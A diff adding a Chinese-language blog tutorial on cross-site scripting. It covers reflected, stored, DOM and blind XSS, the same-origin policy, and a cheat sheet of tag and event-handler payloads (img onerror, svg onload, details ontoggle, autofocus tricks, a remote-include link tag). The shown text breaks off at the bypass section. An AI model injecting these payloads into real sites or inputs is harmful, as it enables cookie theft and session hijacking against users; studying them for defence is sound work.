@@ -1,0 +1,726 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>xss学习 | clown</title><meta name="author" content="clown"><meta name="copyright" content="clown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="xss简介XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 xss分类参考文章：https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;397940947 反射型xss反射型xss的攻击流程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss学习">
+<meta property="og:url" content="https://clowsman.github.io/2024/04/29/xss%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="clown">
+<meta property="og:description" content="xss简介XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 xss分类参考文章：https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;397940947 反射型xss反射型xss的攻击流程">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/clowsman/image@main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240405015048.jpg">
+<meta property="article:published_time" content="2024-04-28T16:37:57.000Z">
+<meta property="article:modified_time" content="2024-05-01T16:12:25.963Z">
+<meta property="article:author" content="clown">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/clowsman/image@main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240405015048.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"><link rel="canonical" href="https://clowsman.github.io/2024/04/29/xss%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'xss学习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-05-02 00:12:25'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015048.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="clown"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"/><span class="site-name">clown</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">xss学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-28T16:37:57.000Z" title="发表于 2024-04-29 00:37:57">2024-04-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-01T16:12:25.963Z" title="更新于 2024-05-02 00:12:25">2024-05-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="xss学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="xss简介"><a href="#xss简介" class="headerlink" title="xss简介"></a>xss简介</h1><p>XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。</p>
+<h1 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h1><p>参考文章：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/397940947">https://zhuanlan.zhihu.com/p/397940947</a></p>
+<h2 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h2><p>反射型xss的攻击流程：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/v2-6d3db83eec67f9c9086da0ea29ff5c3b_720w.webp" alt="img"></p>
+<p>反射型是比较常见的，他通常需要用户点击攻击者制作的链接才会触发，比如一个网站有这样的代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;hello, <span class="hljs-subst">$_GET</span>[&#x27;user&#x27;]&lt;/p&gt;&quot;</span>;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>那么我们可以制作一个url带上js代码给用户点击</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/?user=&lt;/p&gt;&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;&lt;p&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这样用户点击该链接后就会运行js代码</p>
+<p>该方法收到Auditor、NoScript等防御手段影响较大</p>
+<ul>
+<li><p><strong>XSS Auditor</strong>：XSS Auditor 是一些现代浏览器内置的安全特性，它能够检测并阻止某些类型的XSS攻击。当浏览器识别到某些模式或行为与XSS攻击相符时，XSS Auditor 可以自动修改或阻止页面的加载，从而保护用户免受攻击。例如，如果一个网站将用户输入的数据直接回显到页面中，而没有进行适当的处理，XSS Auditor 可能会介入并防止恶意脚本的执行。</p>
+</li>
+<li><p><strong>NoScript</strong>：</p>
+<p>NoScript 是一个浏览器扩展，它允许用户对网页上的脚本执行进行更细粒度的控制。通过NoScript，用户可以设置规则来禁止或允许特定网站或脚本的运行。在默认情况下，NoScript 可以阻止所有未经信任的网站运行JavaScript、Java以及其他可执行的代码。这可以有效地防御XSS 攻击，因为许多XSS 攻击依赖于恶意脚本的执行。</p>
+</li>
+</ul>
+<h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>存储型xss的攻击流程：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/v2-dba2b4a081b759d3b7f11381c8e1e829_720w.webp" alt="img"></p>
+<p>存储型就是黑客改变了对象，直接把对象变为服务器了，将恶意的xss语句存入服务器，这样每次用户访问该正常服务器，服务器都会将带有恶意语句的页面一起返回，这样就可以造成持久化攻击。</p>
+<p>在一些用户留言的功能就很容易发生这类xss。</p>
+<h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。</p>
+<p>例如：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>DOM Based XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">xsstest</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> str = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;input&quot;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;output&quot;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;&lt;img src=&#x27;&quot;</span>+str+<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;output&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;input&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">50</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;xsstest()&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>输入 <code>x&#39; onerror=&#39;javascript:alert(/xss/)</code> 即可触发。</p>
+<p>DOM指的是文档对象模型（Document Object Model)，这是一种编程接口，用于处理可扩展标记语言（XML）和超文本标记语言（HTML）文档。通过DOM，程序员可以动态地访问和更新文档的内容、结构和样式。</p>
+<p>在Web开发中，DOM用于Web浏览器和服务器端的脚本语言（如JavaScript）来操作Web页面。</p>
+<p>比如上文的document.getElementById就是利用DOM来进行web页面的修改。</p>
+<h2 id="Blind-XSS"><a href="#Blind-XSS" class="headerlink" title="Blind XSS"></a>Blind XSS</h2><p>Blind XSS是储存型XSS的一种，它保存在某些存储中，当一个“受害者”访问这个页面时执行，并且在文档对象模型(DOM)中呈现payload。</p>
+<p>但Blind XSS不同的是，该xss类似盲打，即攻击者不知道这些payload会在何时何地执行，不一定能及时得到回显。</p>
+<h1 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h1><p>XSS可以导致下列的情况：</p>
+<ol>
+<li><p>用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。</p>
+</li>
+<li><p>攻击者能够在一定限度内记录用户的键盘输入，比如创建键盘监听器然后捕获信息之后利用<code>XMLHttpRequest</code>或<code>fetch</code>等API发送HTTP请求将数据发送给攻击者。</p>
+</li>
+<li><p>攻击者通过CSRF等方式以用户身份执行危险操作。</p>
+</li>
+<li><p>XSS蠕虫，例如Samy蠕虫</p>
+<p>XSS蠕虫不需要用户下载或执行任何文件，而是通过用户与网页的交互来传播，通常是在用户不知不觉中进行的。</p>
+<p>其工作原理通常如下：</p>
+<ol>
+<li><strong>寻找漏洞</strong>：攻击者寻找存在XSS漏洞的网站，这些漏洞可能允许攻击者注入恶意脚本。</li>
+<li><strong>注入脚本</strong>：攻击者在网站上注入恶意脚本，该脚本可以是自我复制的，即能够自动寻找新的受害者并传播自身。</li>
+<li><strong>传播机制</strong>：恶意脚本会在其他用户访问受感染的页面时执行，利用XSS漏洞将自身的副本注入到用户的会话中，或者诱使用户点击一个恶意链接，从而在用户的浏览器中执行。</li>
+<li><strong>自动化攻击</strong>：XSS蠕虫可以自动执行各种攻击，如发送垃圾邮件、窃取用户信息、会话劫持等。</li>
+<li><strong>隐藏性</strong>：由于XSS蠕虫不需要用户的直接交互，因此具有很高的隐蔽性，用户可能在不知情的情况下就成为了攻击的一部分。</li>
+</ol>
+</li>
+<li><p>获取用户浏览器信息。</p>
+</li>
+<li><p>利用XSS漏洞扫描用户内网。</p>
+</li>
+</ol>
+<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由URL决定，URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。</p>
+<p>这里给出一个与<code>http://store.company.com/dir/page.html</code> 的源进行对比的示例：</p>
+<table>
+<thead>
+<tr>
+<th align="left">URL</th>
+<th align="left">结果</th>
+<th align="left">原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>http://store.company.com/dir2/other.html</code></td>
+<td align="left">同源</td>
+<td align="left">只有路径不同</td>
+</tr>
+<tr>
+<td align="left"><code>http://store.company.com/dir/inner/another.html</code></td>
+<td align="left">同源</td>
+<td align="left">只有路径不同</td>
+</tr>
+<tr>
+<td align="left"><code>https://store.company.com/secure.html</code></td>
+<td align="left">失败</td>
+<td align="left">协议不同</td>
+</tr>
+<tr>
+<td align="left"><code>http://store.company.com:81/dir/etc.html</code></td>
+<td align="left">失败</td>
+<td align="left">端口不同（<code>http://</code> 默认端口是 80）</td>
+</tr>
+<tr>
+<td align="left"><code>http://news.company.com/dir/other.html</code></td>
+<td align="left">失败</td>
+<td align="left">主机不同</td>
+</tr>
+</tbody></table>
+<p>更详细的去看这篇文章就行：<a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html">https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html</a></p>
+<h1 id="XSS常见标签"><a href="#XSS常见标签" class="headerlink" title="XSS常见标签"></a>XSS常见标签</h1><p>参考文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4067?time__1311=n4+xnD0DyGYQqxmw405+bWveAKP0K5DOD0rWD&u_atoken=b42a306fbbc31a9250e2f52be102914c&u_asession=01Umc-NzPKkpo5Cm1MZjj0PcZ4nYfzcCvQavG2wen-1XOfMhKklOuuynvcweWGuiHedlmHJsN3PcAI060GRB4YZGyPlBJUEqctiaTooWaXr7I&u_asig=05oI5YNvJnnW4ZbDwZ0jTEAnhHy28drN60y8oSj1AbOuy1F8ElkQRrO4HJQuPCGSD0Q0e5pVEDWIy78womJUHgWifdqZwkTyUiRS0RPiHtGMt2I4GcnVJ86Vg6pqUzr-2PiDWKzVeX040qH4eMgNzhdR1jz4r4BWyg3a9qlljGt2Fg2QMxYs6lyXb1lFWKql56RmnJ9pstOf9YSdbDJQ1eO604Hhg04odPKsBvl3o2kOTZgvqaz4fxLsoyCWh3mJ8rckYCQmaGgn_DBT-Jtjpp6GNiUV0VqAGRk9VySpSEqdJ6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=Tmy1B2vaFEZ7hbJejFOIbsVnxnA=">XSS总结 - 先知社区 (aliyun.com)</a></p>
+<p>这里就copy一下常用标签，见到新的就补充进来</p>
+<p><strong><script></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong><img></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong><input></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">竞争焦点，从而触发onblur事件,当左边的框要失去焦点时就会执行xss代码<br>&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240429235853943.png" alt="image-20240429235853943"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240429235920732.png" alt="image-20240429235920732"></p>
+<p><strong><details></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br>该标签用于展示详细信息，当收起或展开时就会弹出xss<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240430000454901.png" alt="image-20240430000454901"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">使用open属性触发ontoggle事件，无需用户去触发，就是在进入页面时自动帮你展开一次详情<br>&lt;details open ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong><svg></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;svg onload=alert(&quot;xss&quot;);&gt;<br><br>SVG（Scalable Vector Graphics，可缩放矢量图形）元素；<br>onload 事件属性在 SVG 元素加载完成后触发，类似于 HTML 中的 &lt;img&gt; 标签的 onload 事件。<br></code></pre></td></tr></table></figure>
+
+<p><strong><select></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;<br>&lt;select&gt; 是 HTML 中的一个元素，用于创建下拉列表。用户可以从列表中选择一个选项。<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240430000930281.png" alt="image-20240430000930281"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>&lt;select onfocus=alert(1) autofocus&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong><iframe></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;<br>&lt;iframe&gt; 是 HTML 中的一个元素，用于在当前页面内嵌入另一个 HTML 页面。onload 事件属性指定了当 &lt;iframe&gt; 完成加载过程时应该执行的 JavaScript 代码。<br></code></pre></td></tr></table></figure>
+
+<p><strong><video></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;<br>跟image差不多，该标签用于嵌入视频内容，没有加载视频时就执行onerror<br></code></pre></td></tr></table></figure>
+
+<p><strong><audio></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;<br>这个标签用于嵌入音频内容<br></code></pre></td></tr></table></figure>
+
+<p><strong><body></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;body/onload=alert(&quot;xss&quot;);&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;body<br>onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;<br>//onscroll 是一个内联事件处理器，它在用户滚动页面时触发，这里就是利用多个换行符自动追焦到输入框造成滚动效果<br></code></pre></td></tr></table></figure>
+
+<p>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</p>
+<p><strong><textarea></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong><keygen></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐<br></code></pre></td></tr></table></figure>
+
+<p><strong><marquee></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以<br></code></pre></td></tr></table></figure>
+
+<p><strong><isindex></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE<br></code></pre></td></tr></table></figure>
+
+<h1 id="利用link远程包含js文件"><a href="#利用link远程包含js文件" class="headerlink" title="利用link远程包含js文件"></a>利用link远程包含js文件</h1><p>该标签在无CSP的情况下可以远程包含js文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h1 id="XSS-Bypass"><a href="#XSS-Bypass" class="headerlink" title="XSS Bypass"></a>XSS Bypass</h1><h2 id="利用html属性绕过"><a href="#利用html属性绕过" class="headerlink" title="利用html属性绕过"></a>利用html属性绕过</h2><p>可以使用一些不同的属性去尝试一下：</p>
+<ol>
